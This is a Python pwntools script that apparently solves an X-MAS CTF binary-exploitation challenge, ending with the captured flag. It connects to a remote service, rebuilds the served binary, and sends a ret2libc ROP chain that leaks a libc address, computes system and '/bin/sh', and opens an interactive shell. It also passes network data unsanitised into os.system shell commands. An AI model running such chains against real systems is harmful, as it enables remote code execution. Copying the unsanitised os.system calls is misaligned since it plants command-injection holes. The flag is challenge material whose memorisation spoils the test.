from pwn import *
import os
from elftools.elf.elffile import ELFFile 


p=remote("challs.xmas.htsp.ro",12002)

p.recvuntil("Content: b'")
data=p.recvuntil("'")[:-1]
p.recv()
os.system("echo \""+data+"\"|base64 -d > bin")
os.system("chmod +x bin")
os.system("objdump -R bin|grep setvbuf|cut -d' ' -f1 >setvbuf")
setvbuf_got=int(open("setvbuf","r").read()[:-1],16)

print "setvbuf_got :",hex(setvbuf_got)

puts_plt=0x00000000004005c0

entry=""
with open('./bin', 'rb') as f:
    e = ELFFile(f)
    for section in e.iter_sections():
        if section.name==".text":
        	entry=section['sh_addr']

os.system("ROPgadget --binary bin|grep 'pop rdi'|cut -d' ' -f1 > pop_rdi")
os.system("ROPgadget --binary bin|grep ': ret$'|cut -d' ' -f1 >ret")
ret=int(open("./ret","r").readline(),16)
pop_rdi=int(open("./pop_rdi","r").readline(),16)
print "ret :",hex(ret)
print "pop rdi :",hex(pop_rdi)
print "puts_plt :",hex(puts_plt)
print "entry :",hex(entry)


inp=raw_input("give offset :")
offset=int(inp,10)
payload=""
payload+="A"*offset
payload+=p64(pop_rdi)
payload+=p64(setvbuf_got)
payload+=p64(puts_plt)
payload+=p64(entry)

p.sendline(payload)
p.recvuntil("!")
p.recvline()
p.recvline()
data=p.recvuntil("What's your name?")[:-18]
leak=u64(data.ljust(8,"\x00"))
print "leak :",hex(leak)
base=leak-0x0812f0
system=base+0x04f440
binsh=base+0x1b3e9a
print "base :",hex(base)
print "system :",hex(system)
print "binsh :",hex(binsh)

payload=""
payload+="A"*offset
payload+=p64(ret)
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(system)

p.sendline(payload)
p.sendline("id")
p.interactive()""

"""
X-MAS{0h_1_7h1nk_y0u_4r3_4_r0b07}
"""

